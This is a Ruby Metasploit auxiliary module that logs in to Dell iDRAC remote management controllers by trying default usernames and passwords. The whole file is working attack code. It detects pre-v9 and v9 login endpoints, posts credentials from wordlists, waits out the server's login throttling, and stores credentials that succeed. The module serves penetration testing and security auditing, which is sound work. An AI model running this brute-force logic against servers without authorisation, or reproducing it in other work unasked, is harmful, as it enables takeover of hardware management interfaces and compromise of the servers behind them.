##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Dell iDRAC Default Login',
      'Description' => %q{
        This module attempts to login to a iDRAC webserver instance using
        default username and password.  Tested against Dell Remote Access
        Controller 6 - Express version 1.50 and 1.85,
        Controller 7 - Enterprise 2.63.60.62
        Controller 8 - Enterprise 2.83.05
        Controller 9 - Enterprise 4.40.00.00
      },
      'Author' => [
        'Cristiano Maruti <cmaruti[at]gmail.com>', # < v8
        'h00die' # v8, v9
      ],
      'References' => [
        ['CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration Login page', '/']),
      OptPath.new('USER_FILE', [
        false, 'File containing users, one per line',
        File.join(Msf::Config.data_directory, 'wordlists', 'idrac_default_user.txt')
      ]),
      OptPath.new('PASS_FILE', [
        false, 'File containing passwords, one per line',
        File.join(Msf::Config.data_directory, 'wordlists', 'idrac_default_pass.txt')
      ]),
      OptInt.new('RPORT', [true, 'Default remote port', 443])
    ])

    register_advanced_options([
      OptBool.new('SSL', [true, 'Negotiate SSL connection', true])
    ])
  end

  def pre_v9_url
    normalize_uri(target_uri.path, 'data', 'login')
  end

  def v9_url
    normalize_uri(target_uri.path, 'sysmgmt', '2015', 'bmc', 'session')
  end

  def target_url
    proto = 'http'
    if (rport == 443) || ssl
      proto = 'https'
    end
    uri = normalize_uri(datastore['URI'])
    "#{proto}://#{vhost}:#{rport}#{uri}"
  end

  def do_login_pre9(user = nil, pass = nil)
    if @blockingtime > 0
      sleep(@blockingtime)
    end
    uri = pre_v9_url
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'SSL' => true,
      'vars_post' => {
        'user' => user,
        'password' => pass
      }
    })
    unless auth
      print_error('iDRAC failed to respond to login attempt')
      return :next_user # assume this is a temporary error
    end
    body = auth.body.to_s
    if !body.match(%r{<authResult>[0|5]</authResult>}).nil?
      print_good("#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        user: user,
        password: pass,
        proof: auth.body.to_s
      )
      return :next_user
    else
      vprint_error("#{target_url} - Failed to login as '#{user}' with password '#{pass}'")
      # seen on idrac 8
      if body =~ %r{<blockingTime>(\d+)</blockingTime>}
        @blockingtime = Regexp.last_match(1).to_i
        vprint_error("\tServer throttled logins at #{@blockingtime} seconds")
      else
        @blockingtime = 0
      end
    end
  end

  def do_login_v9(user = nil, pass = nil)
    if @blockingtime > 0
      sleep(@blockingtime)
    end
    uri = v9_url
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'SSL' => true,
      'headers' => { 'user' => user, 'password' => pass },
      'vars_post' => {
        'user' => user,
        'password' => pass
      }
    })
    unless auth
      print_error('iDRAC failed to respond to login attempt')
      return :next_user # assume this is a temporary error
    end
    json = JSON.parse(auth.body)
    if json.nil?
      print_error('Invalid response, not JSON. Likely not an iDRAC.')
      return
    end
    if json['authResult'] == 1 or json['authResult'] == 8
      vprint_error("#{target_url} - Dell iDRAC - Failed to login as '#{user}' with password '#{pass}'")
      if !json['blockingTime'].nil? && json['blockingTime'] > 0
        @blockingtime = json['blockingTime']
        vprint_error("\tServer throttled logins at #{@blockingtime} seconds")
      else
        @blockingtime = 0
      end
    else
      print_good("#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        user: user,
        password: pass,
        proof: auth.body.to_s
      )
      return :next_user
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: DateTime.now,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    print_status("Verifying that login page exists at #{ip}")
    server_response = false
    @blockingtime = 0
    begin
      # <= v8
      res = send_request_raw({
        'method' => 'GET',
        'uri' => pre_v9_url
      })

      if res && res.code == 200
        server_response = true
        if !res.body.to_s.match(/<authResult>1/).nil? || # version <8
           !res.body.to_s.match(/<authResult>99/).nil? # version 8 of idrac shows 99 on first connect
          print_status('Attempting authentication against iDRAC version < 9')

          each_user_pass do |user, pass|
            do_login_pre9(user, pass)
          end
        elsif res.code == 301
          print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
          return :abort
        else
          print_error("The iDRAC login page not detected on #{ip}")
          return :abort
        end
      end

      # v9
      unless server_response
        res = send_request_raw({
          'method' => 'GET',
          'uri' => v9_url
        })

        if res && res.code == 401
          server_response = true
          json = JSON.parse(res.body)
          if json.nil?
            server_response = nil # so we can use the error message at the end
          elsif !json['authResult'].nil? # version 9
            print_status('Attempting authentication against iDRAC version 9')

            each_user_pass do |user, pass|
              do_login_v9(user, pass)
            end
          elsif res.code == 301
            print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
            return :abort
          else
            print_error("The iDRAC login page not detected on #{ip}")
            return :abort
          end
        end
      end

      unless server_response
        print_error("The iDRAC login page not detected on #{ip}")
        return :abort
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if (e.to_s.match(/^SSL_connect /)) # strange errors / exception if SSL connection aborted
    end
  end
end
